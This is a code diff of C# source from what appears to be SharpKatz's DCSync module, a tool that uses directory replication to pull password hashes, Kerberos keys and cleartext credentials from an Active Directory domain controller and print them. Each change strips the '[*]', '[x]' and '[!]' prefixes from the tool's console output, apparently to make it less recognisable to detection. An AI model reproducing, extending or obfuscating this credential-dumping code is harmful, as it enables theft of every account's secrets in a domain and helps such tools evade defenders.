@@ -293,7 +293,7 @@ namespace SharpKatz.Module
                 exportpath = Path.GetTempPath() + DateTime.Now.ToString("ddMMyyyyHHmmss", DateTimeFormatInfo.InvariantInfo) + ".txt";
                 FileStream outputfile = File.Create(exportpath);
                 outputfile.Close();
-                Console.WriteLine("[*] Output file will be {0}", exportpath);
+                Console.WriteLine("   Output file will be {0}", exportpath);
             }
 
             Asn1_init();
@@ -363,27 +363,27 @@ namespace SharpKatz.Module
                             }
                             else
                             {
-                                Console.WriteLine("[x] Error getting replication data: {0}", result);
+                                Console.WriteLine("   Error getting replication data: {0}", result);
                                 return false;
                             }
                         } while (Convert.ToBoolean(mSG_GETCHGREPLY.fMoreData));
                     }
                     else
                     {
-                        Console.WriteLine("[x] Error DC bind: {0}", result);
+                        Console.WriteLine("   Error DC bind: {0}", result);
                     }
                 }
             }
             else
             {
-                Console.WriteLine("[x] Error CreateBind");
+                Console.WriteLine("   Error CreateBind");
             }
 
             Asn1_term();
 
             if (alldata)
             {
-                Console.WriteLine("[*] Replication data exported");
+                Console.WriteLine("   Replication data exported");
             }
 
             return true;
@@ -633,9 +633,9 @@ namespace SharpKatz.Module
 
                         if (secAuth.UserLength > 0)
                         {
-                            Console.WriteLine("[!] [AUTH] Username: {0}", authuser);
-                            Console.WriteLine("[!] [AUTH] Domain  : {0}", authdomain);
-                            Console.WriteLine("[!] [AUTH] Password: {0}", authpassword);
+                            Console.WriteLine("   [AUTH] Username: {0}", authuser);
+                            Console.WriteLine("   [AUTH] Domain  : {0}", authdomain);
+                            Console.WriteLine("   [AUTH] Password: {0}", authpassword);
                         }
                         
                     }
@@ -660,7 +660,7 @@ namespace SharpKatz.Module
 
                     if (forcentlm)
                     {
-                        Console.WriteLine("[!] [AUTH] Explicit NTLM Mode");
+                        Console.WriteLine("   [AUTH] Explicit NTLM Mode");
                     }
 
                     rpcStatus = (NTSTATUS)RpcBindingSetAuthInfoEx(hBinding, altservice + "/" + dc, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, (uint)rpcAuth, psecAuth, 0, ref securityqos);
@@ -672,14 +672,14 @@ namespace SharpKatz.Module
                         rpcStatus = (NTSTATUS)RpcBindingSetOption(hBinding, RPC_C_OPT_SECURITY_CALLBACK, Marshal.GetFunctionPointerForDelegate(rpcSecurityCallbackDelegate));
                         if (rpcStatus != 0)
                         {
-                            Console.WriteLine("[x] Error RpcBindingSetOption :  {0}", rpcStatus);
+                            Console.WriteLine("   Error RpcBindingSetOption :  {0}", rpcStatus);
                             Unbind(hBinding);
                             hBinding = IntPtr.Zero;
                         }
                     }
                     else
                     {
-                        Console.WriteLine("[x] Error RpcBindingSetAuthInfoEx :  {0}", rpcStatus);
+                        Console.WriteLine("   Error RpcBindingSetAuthInfoEx :  {0}", rpcStatus);
                         Unbind(hBinding);
                         hBinding = IntPtr.Zero;
                     }
@@ -694,7 +694,7 @@ namespace SharpKatz.Module
             }
             else
             {
-                Console.WriteLine("[x] Error RpcStringBindingCompose :  {0}", rpcStatus);
+                Console.WriteLine("   Error RpcStringBindingCompose :  {0}", rpcStatus);
             }
 
             return hBinding;
@@ -725,12 +725,12 @@ namespace SharpKatz.Module
                     }
                     else
                     {
-                        Console.WriteLine("[x] QueryContextAttributes {0}", secStatus);
+                        Console.WriteLine("   QueryContextAttributes {0}", secStatus);
                     }
                 }
                 else
                 {
-                    Console.WriteLine("[x] I_RpcBindingInqSecurityContext {0}", rpcStatus);
+                    Console.WriteLine("   I_RpcBindingInqSecurityContext {0}", rpcStatus);
                 }
             }
 
@@ -785,12 +785,12 @@ namespace SharpKatz.Module
                 }
                 else
                 {
-                    Console.WriteLine("[x] Error getting domain controller info: {0}", result);
+                    Console.WriteLine("   Error getting domain controller info: {0}", result);
                 }
             }
             else
             {
-                Console.WriteLine("[x] Error DC bind with default Guid: {0}", result);
+                Console.WriteLine("   Error DC bind with default Guid: {0}", result);
             }
 
             return false;
@@ -830,7 +830,7 @@ namespace SharpKatz.Module
             {
                 extensions_out = new DRS_EXTENSIONS_INT();
                 int ex = Marshal.GetExceptionCode();
-                Console.WriteLine("[x] Error:" + ex);
+                Console.WriteLine("   Error:" + ex);
                 return ex;
             }
             return (int)result.ToInt64();
@@ -1285,18 +1285,18 @@ namespace SharpKatz.Module
             dic.TryGetValue("ATT_SERVICE_PRINCIPAL_NAME", out object spn);
             dic.TryGetValue("ATT_USER_PRINCIPAL_NAME", out object upn);
 
-            Console.WriteLine("[*]");
-            Console.WriteLine("[*] Object RDN           : {0}", rdn);
-            Console.WriteLine("[*]");
-            Console.WriteLine("[*] ** SAM ACCOUNT **");
-            Console.WriteLine("[*]");
-            Console.WriteLine("[*] SAM Username         : {0}", samAccountName);
-            Console.WriteLine("[*] User Principal Name  : {0}", upn);
-            Console.WriteLine("[*] Account Type         : {0}", SamAccountTypeToString(Convert.ToUInt32(samAccountType)));
-            Console.WriteLine("[*] User Account Control : {0}", UacToString(Convert.ToInt32(uac)));
-            Console.WriteLine("[*] Account expiration   : {0}", accountExp);
-            Console.WriteLine("[*] Password last change : {0}", pwdLastSet);
-            Console.WriteLine("[*] Object Security ID   : {0}", objectSid);
+            Console.WriteLine("  ");
+            Console.WriteLine("   Object RDN           : {0}", rdn);
+            Console.WriteLine("  ");
+            Console.WriteLine("   ** SAM ACCOUNT **");
+            Console.WriteLine("  ");
+            Console.WriteLine("   SAM Username         : {0}", samAccountName);
+            Console.WriteLine("   User Principal Name  : {0}", upn);
+            Console.WriteLine("   Account Type         : {0}", SamAccountTypeToString(Convert.ToUInt32(samAccountType)));
+            Console.WriteLine("   User Account Control : {0}", UacToString(Convert.ToInt32(uac)));
+            Console.WriteLine("   Account expiration   : {0}", accountExp);
+            Console.WriteLine("   Password last change : {0}", pwdLastSet);
+            Console.WriteLine("   Object Security ID   : {0}", objectSid);
 
             if (objectSid != null)
             {
@@ -1311,31 +1311,31 @@ namespace SharpKatz.Module
                 if (subSid != IntPtr.Zero)
                 {
                     uint rid = (uint)Marshal.ReadInt32(subSid);
-                    Console.WriteLine("[*] Object Relative ID   : {0}", rid);
+                    Console.WriteLine("   Object Relative ID   : {0}", rid);
                 }
             }
-            Console.WriteLine("[*]");
+            Console.WriteLine("  ");
 
             if (unicodePwd != null || ntPwdHistory != null || lmPwd != null || lmPwdHistory != null)
             {
-                Console.WriteLine("[*] Credentials:");
+                Console.WriteLine("   Credentials:");
                 if (unicodePwd != null)
                 {
-                    Console.WriteLine("[*] Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
+                    Console.WriteLine("   Hash NTLM            : {0}", Utility.PrintHashBytes((byte[])unicodePwd));
                 }
                 if (ntPwdHistory != null)
                 {
-                    Console.WriteLine("[*] ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
+                    Console.WriteLine("   ntlm- 0              : {0}", Utility.PrintHashBytes((byte[])ntPwdHistory));
                 }
                 if (lmPwd != null)
                 {
-                    Console.WriteLine("[*] LM  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
+                    Console.WriteLine("   LM  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwd));
                 }
                 if (lmPwdHistory != null)
                 {
-                    Console.WriteLine("[*] lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwdHistory));
+                    Console.WriteLine("   lm  - 0              : {0}", Utility.PrintHashBytes((byte[])lmPwdHistory));
                 }
-                Console.WriteLine("[*]");
+                Console.WriteLine("  ");
             }
 
             DcsyncDescrUserProperties((byte[])suppCredential);
@@ -1358,8 +1358,8 @@ namespace SharpKatz.Module
             {
                 int propertyConut = BitConverter.ToInt16((byte[])suppCredential, offsetConunt);
 
-                Console.WriteLine("[*] Supplemental Credentials: ");
-                Console.WriteLine("[*]");
+                Console.WriteLine("   Supplemental Credentials: ");
+                Console.WriteLine("  ");
 
                 int readedSize = 0;
                 for (int i = 0; i < propertyConut; i++)
@@ -1375,14 +1375,14 @@ namespace SharpKatz.Module
 
                     byte[] propertyValueBytes = Utility.StringToByteArray(propertyRawValue);
 
-                    Console.WriteLine("[*]  * {0}", propertyName);
+                    Console.WriteLine("    * {0}", propertyName);
 
                     switch (propertyName)
                     {
                         case Packages:
                         case PrimaryCleartext:
                             {
-                                Console.WriteLine("[*] \t{0}", Encoding.Unicode.GetString(propertyValueBytes));
+                                Console.WriteLine("   \t{0}", Encoding.Unicode.GetString(propertyValueBytes));
 
                             }
                             break;
@@ -1391,13 +1391,13 @@ namespace SharpKatz.Module
                                 KERB_STORED_CREDENTIAL cred = Utility.ReadStruct<KERB_STORED_CREDENTIAL>(propertyValueBytes);
 
                                 string dsalt = Encoding.Unicode.GetString(propertyValueBytes, (int)cred.DefaultSaltOffset, cred.DefaultSaltLength);
-                                Console.WriteLine("[*] \tDefault Salt :{0}", dsalt);
+                                Console.WriteLine("   \tDefault Salt :{0}", dsalt);
 
-                                Console.WriteLine("[*] \t{0}", "Credentials");
+                                Console.WriteLine("   \t{0}", "Credentials");
                                 KeyDataInfo(propertyValueBytes, Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL)), cred.CredentialCount);
 
                                 int new_start = (cred.CredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA))) + Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL));
-                                Console.WriteLine("[*] \t{0}", "OldCredentials");
+                                Console.WriteLine("   \t{0}", "OldCredentials");
                                 KeyDataInfo(propertyValueBytes, new_start, cred.OldCredentialCount);
                             }
                             break;
@@ -1406,28 +1406,28 @@ namespace SharpKatz.Module
                                 KERB_STORED_CREDENTIAL_NEW cred = Utility.ReadStruct<KERB_STORED_CREDENTIAL_NEW>(propertyValueBytes);
 
                                 string dsalt = Encoding.Unicode.GetString(propertyValueBytes, (int)cred.DefaultSaltOffset, cred.DefaultSaltLength);
-                                Console.WriteLine("[*] \tDefault Salt :{0}", dsalt);
+                                Console.WriteLine("   \tDefault Salt :{0}", dsalt);
 
-                                Console.WriteLine("[*] \t{0}", "Credentials");
+                                Console.WriteLine("   \t{0}", "Credentials");
                                 KeyDataNewInfo(propertyValueBytes, Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL_NEW)), cred.CredentialCount);
 
                                 int new_start = (cred.CredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + Marshal.SizeOf(typeof(KERB_STORED_CREDENTIAL_NEW));
-                                Console.WriteLine("[*] \t{0}", "ServiceCredentials");
+                                Console.WriteLine("   \t{0}", "ServiceCredentials");
                                 KeyDataNewInfo(propertyValueBytes, new_start, cred.ServiceCredentialCount);
 
                                 new_start = (cred.ServiceCredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + new_start;
-                                Console.WriteLine("[*] \t{0}", "OldCredentials");
+                                Console.WriteLine("   \t{0}", "OldCredentials");
                                 KeyDataNewInfo(propertyValueBytes, new_start, cred.OldCredentialCount);
 
                                 new_start = (cred.OldCredentialCount * Marshal.SizeOf(typeof(KERB_KEY_DATA_NEW))) + new_start;
-                                Console.WriteLine("[*] \t{0}", "OlderCredentials");
+                                Console.WriteLine("   \t{0}", "OlderCredentials");
                                 KeyDataNewInfo(propertyValueBytes, new_start, cred.OlderCredentialCount);
 
                             }
                             break;
                         case PrimaryNtlmStrongNTOWF:
                             {
-                                Console.WriteLine("[*] \tRandom Value : {0}", Utility.PrintHashBytes(propertyValueBytes));
+                                Console.WriteLine("   \tRandom Value : {0}", Utility.PrintHashBytes(propertyValueBytes));
 
                             }
                             break;
@@ -1438,20 +1438,20 @@ namespace SharpKatz.Module
                                 for (int j = 0; j < numberOfHashes; j++)
                                 {
                                     Array.Copy(propertyValueBytes, hashesOffset + (j * MD5_DIGEST_LENGTH), tmp_b, 0, tmp_b.Length);
-                                    Console.WriteLine("[*] \t{0} {1}", (j + 1).ToString().PadLeft(2, '0'), Utility.PrintHashBytes(tmp_b));
+                                    Console.WriteLine("   \t{0} {1}", (j + 1).ToString().PadLeft(2, '0'), Utility.PrintHashBytes(tmp_b));
 
                                 }
                             }
                             break;
                         default:
                             {
-                                Console.WriteLine("[*] \tUnknown data : {0}", Utility.PrintHashBytes(propertyValueBytes));
+                                Console.WriteLine("   \tUnknown data : {0}", Utility.PrintHashBytes(propertyValueBytes));
 
                             }
                             break;
 
                     }
-                    Console.WriteLine("[*]");
+                    Console.WriteLine("  ");
 
 
                     readedSize += offsetName + nameLength + valueLength;
@@ -1499,7 +1499,7 @@ namespace SharpKatz.Module
 
                 byte[] keybyte = new byte[kkd.KeyLength];
                 Array.Copy(data, kkd.KeyOffset, keybyte, 0, keybyte.Length);
-                Console.WriteLine("[*] \t{0} : {1}", KerberosTicketEtype(kkd.KeyType), Utility.PrintHashBytes(keybyte));
+                Console.WriteLine("   \t{0} : {1}", KerberosTicketEtype(kkd.KeyType), Utility.PrintHashBytes(keybyte));
 
             }
         }
@@ -1514,7 +1514,7 @@ namespace SharpKatz.Module
 
                 byte[] keybyte = new byte[kkd.KeyLength];
                 Array.Copy(data, kkd.KeyOffset, keybyte, 0, keybyte.Length);
-                Console.WriteLine("[*] \t{0} {1}: {2}", KerberosTicketEtype(kkd.KeyType), kkd.IterationCount, Utility.PrintHashBytes(keybyte));
+                Console.WriteLine("   \t{0} {1}: {2}", KerberosTicketEtype(kkd.KeyType), kkd.IterationCount, Utility.PrintHashBytes(keybyte));
 
             }
         }
